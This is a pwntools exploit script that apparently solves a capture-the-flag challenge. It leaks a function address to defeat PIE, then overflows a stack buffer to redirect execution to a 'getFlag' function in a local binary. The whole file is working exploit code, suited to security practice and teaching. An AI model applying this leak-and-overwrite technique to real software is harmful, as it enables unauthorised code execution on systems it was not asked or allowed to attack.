#!/bin/python3

from pwn import *

p = process('./pwn')
e = ELF('./pwn')



p.recvuntil(b'greeter: ')
greeter_addr = int(p.recvuntil(b'\n').rstrip(), 16)
log.info(f'Got address of greeter: {hex(greeter_addr)}')

base_addr = greeter_addr - e.sym['greeter']
getFlag_addr = base_addr + e.sym['getFlag']

offset = 0x7ffd3f04cf98 - 0x7ffd3f04cf86

payload = b'A'*offset
payload += p64(getFlag_addr)

p.sendline(payload)

p.interactive()
